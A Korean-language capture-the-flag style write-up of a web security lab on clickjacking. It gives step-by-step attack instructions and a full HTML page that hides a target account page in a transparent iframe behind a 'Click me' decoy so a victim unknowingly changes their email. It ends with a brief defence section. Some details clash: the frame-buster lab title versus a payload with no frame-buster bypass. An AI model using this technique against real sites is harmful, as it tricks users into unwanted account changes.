# 🚩Lab: Clickjacking with a frame buster script
```text
This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection.
The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy.
The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter
```

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인해본다.
2. 로그인하면 `/my-account`로 리다이렉트한다. 이 페이지에는 `X-Frame-Options`, `CSP`가 설정되어 있지 않음. 따라서 제한없이 iframe에 적재 가능하다.
3. `/my-account` 페이지에는 `change email`이 존재. 해당 동작을 clickjacking을 통해 유도해야함.
4. 쿼리 스트링에 `email=a@d`를 줘서 버튼 한번만 누르면 바로 email이 변경되도록 해보자. 
5. exploit 서버로 이동해 코드를 작성한다.
```html
<html>

<head>
  <meta charset="utf-8">
  <title>lab-basic-csrf-protected</title>
  <style>
    .container {
      position: relative;
      width: 500px;
      height: 600px;
    }

    .decoy {
      position: absolute;
      top: 501px;
      left: 75px;
      z-index: 1;
    }

    .target {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.5;
      z-index: 2;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="decoy">Click me</div>
    <iframe class="target"
      src="https://[lab-id].web-security-academy.net/my-account?email=a@d"></iframe>
  </div>
</body>

</html>
```
6. iframe의 opacity를 처음에는 불투명하게 둔 후, decoy의 위치를 개발자 도구에서 수동으로 조절해보며 겹치도록 설정한다.
7. 정확히 겹치는 top, left 값을 찾은 후 기록해두자.
8. 기록해둔 값으로 공격자 서버에서 수정후 save.
9. 피해자에게 전송 -> solve
### 💡 취약점 원리
  클릭 한번으로 작동하는 change email 프로세스 자체에도 문제가 있으나, 클릭재킹의 관점에서만 살펴보면 iframe src에 대한 아무런 제약 사항이 없다라는 문제가 존재한다. CSP와 X-Frame-Options의 조합으로 방어할 수 있다.
